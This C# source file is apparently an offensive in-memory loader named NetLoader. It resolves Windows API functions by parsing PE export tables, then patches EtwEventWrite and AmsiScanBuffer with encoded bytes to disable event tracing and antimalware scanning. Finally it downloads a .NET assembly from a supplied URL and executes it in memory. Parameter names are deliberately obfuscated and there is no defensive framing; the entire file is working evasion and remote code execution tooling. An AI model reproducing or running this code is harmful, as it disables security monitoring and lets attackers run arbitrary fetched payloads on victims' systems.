using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;
using System.Threading;
using System.Diagnostics;


public class NetLoader {

	
	// start define functions

	

	public static IntPtr GetLoadedModuleAddress(string DLLName)
	{
		ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
		foreach (ProcessModule Mod in ProcModules)
		{
			if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
			{
				return Mod.BaseAddress;
			}
		}
		return IntPtr.Zero;
	}
	public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
	{
		IntPtr FunctionPtr = IntPtr.Zero;
		try
		{
			// Traverse the PE header in memory
			Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
			Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
			Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
			Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
			Int64 pExport = 0;
			if (Magic == 0x010b)
			{
				pExport = OptHeader + 0x60;
			}
			else
			{
				pExport = OptHeader + 0x70;
			}

			// Read -> IMAGE_EXPORT_DIRECTORY
			Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
			Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
			Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
			Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
			Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
			Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
			Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

			// Loop the array of export name RVA's
			for (int i = 0; i < NumberOfNames; i++)
			{
				string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
				if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
				{
					Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
					Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
					FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
					break;
				}
			}
		}
		catch
		{
			// Catch parser failure
			throw new InvalidOperationException("Failed to parse module exports.");
		}

		if (FunctionPtr == IntPtr.Zero)
		{
			// Export not found
			throw new MissingMethodException(ExportName + ", export not found.");
		}
		return FunctionPtr;
	}
	public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
	{
		IntPtr hModule = GetLoadedModuleAddress(DLLName);
		if (hModule == IntPtr.Zero)
		{
			throw new DllNotFoundException(DLLName + ", Dll was not found.");
		}

		return GetExportAddress(hModule, FunctionName);
	}

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr GetProcAddress(IntPtr UrethralgiaOrc, string HypostomousBuried);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool VirtualProtect(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscribed, out uint ZygosisCoordination);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr LoadLibrary(string LiodermiaGranulater);

    private static object[] globalArgs = null;


    //end define functions
    //start main
    public static void Main(string[] args)
    {

        PatchETW();

        PathAMSI();
        string payloadPathOrUrl = "";
        string[] payloadArgs = new string[] { };

        bool base64Enc = false;
        	
        
        int secProTypeHolde = (Convert.ToInt32("384") * Convert.ToInt32("8"));
        if (args.Length > 0)
        {

            foreach (string argument in args)
            {
                if (argument.ToLower() == "-path" || argument.ToLower() == "--path")
                {
                    int argData = Array.IndexOf(args, argument) + 1;
                    if (argData < args.Length)
                    {
                        string rawPayload = args[argData];
                        if (base64Enc)
                            payloadPathOrUrl = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayload));
                        else
                            payloadPathOrUrl = rawPayload;
                    }
                }



            }


            if (string.IsNullOrEmpty(payloadPathOrUrl))
            {
                
                Environment.Exit(0);
            }



            TriggerPayload(payloadPathOrUrl, payloadArgs, secProTypeHolde);
            Environment.Exit(0);


        }
    }
    //end main
    // start is 64 bit
    private static bool is64Bit()
	{
		if (IntPtr.Size == 4)
			return false;

		return true;
	}
	//end is 64 bit
	//start everything AMSI
	private static IntPtr getAMSILocation()
	{
		//GetProcAddress
		IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
		IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", "LoadLibraryA");

		GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
		LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));

		return fGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
	}
	private static void PathAMSI()
	{

		IntPtr amsiLibPtr = unProtect(getAMSILocation());
		if (amsiLibPtr != (IntPtr)0)
		{
			Marshal.Copy(getAMSIPayload(), 0, amsiLibPtr, getAMSIPayload().Length);
			Console.WriteLine("[+]  bypass 2 done ...");
		}
		else
		{
			Console.WriteLine("[-] AMSI BYPASS FAILED");
		}

	}

	private static IntPtr unProtect(IntPtr amsiLibPtr)
	{

		IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");

		VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

		uint newMemSpaceProtection = 0;
		if (fVirtualProtect(amsiLibPtr, (UIntPtr)getAMSIPayload().Length, 0x40, out newMemSpaceProtection))
		{
			return amsiLibPtr;
		}
		else
		{
			return (IntPtr)0;
		}

	}

	private static byte[] getAMSIPayload()
	{
		if (!is64Bit())
			return Convert.FromBase64String("uFcAB4DCGAA=");
		return Convert.FromBase64String("uFcAB4DD");
	}

	//end everything AMSI


	// start everything ETW
	private static byte[] getETWPayload()
	{
		if (!is64Bit())
			return Convert.FromBase64String("whQA");
		return Convert.FromBase64String("ww==");
	}


	private static void PatchETW()
	{
		IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
		IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");

		VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

		var patch = getETWPayload();
		uint oldProtect;

		if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
		{
			Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
			Console.WriteLine("[+]  bypass 1 done ...");
		}


	}

    // end everything ETW
    // start trigger payload
    private static Assembly loadASM(byte[] byteArray)
    {
        return Assembly.Load(byteArray);
    }
    private static Type junkFunction(MethodInfo methodInfo)
    {
        return methodInfo.ReflectedType;
    }
    private static byte[] downloadURL(string url)
	{
		HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(url);
		myRequest.Proxy.Credentials = CredentialCache.DefaultCredentials;
		myRequest.Method = "GET";
		WebResponse myResponse = myRequest.GetResponse();
		MemoryStream ms = new MemoryStream();
		myResponse.GetResponseStream().CopyTo(ms);
		return ms.ToArray();
	}
	private static object invokeCSharpMethod(MethodInfo methodInfo)
	{
		if (junkFunction(methodInfo) == methodInfo.ReflectedType)
			methodInfo.Invoke(null, globalArgs);
		Console.ReadLine();
		return globalArgs[0];
	}
    private static MethodInfo getEntryPoint(Assembly asm)
    {

        return asm.EntryPoint;
    }
    private static void unEncDeploy(byte[] data)
	{

		invokeCSharpMethod(getEntryPoint(loadASM(data)));

	}
	public static int setProtocolTLS(int secProt)
	{
		ServicePointManager.SecurityProtocol = (SecurityProtocolType)secProt;
		return secProt;
	}
	private static void TriggerPayload(string payloadPathOrURL, string[] inputArgs, int setProtType = 0)
	{
		setProtocolTLS(setProtType);

		if (!string.IsNullOrEmpty(string.Join(" ", inputArgs)))
			Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
		else
		{
			Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
		}
		globalArgs = new object[] { inputArgs };



	if (payloadPathOrURL.ToLower().StartsWith("http"))
		{

			unEncDeploy(downloadURL(payloadPathOrURL));
		}

		else
			Console.WriteLine("[-]Something went wrong...refer line 136");

	}
	//end trigger payload
	
}

